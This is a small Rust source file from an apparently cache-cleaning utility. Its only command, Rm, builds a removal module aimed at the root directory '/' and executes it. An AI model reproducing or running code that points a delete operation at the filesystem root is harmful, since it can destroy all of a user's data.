use crate::mods::rm::RmModuleBuilder;
use crate::mods::base::ByeCacheMod;

pub enum Command {
    Rm,
}

impl Command {
    pub fn execute(&self) {
        match *self {
            Command::Rm => rm_cmd(),
        }
    }
}

fn rm_cmd() {
    let rm_instance = RmModuleBuilder::new()
        .dir("/".to_string())
        .build();

    rm_instance.execute().wait();
}
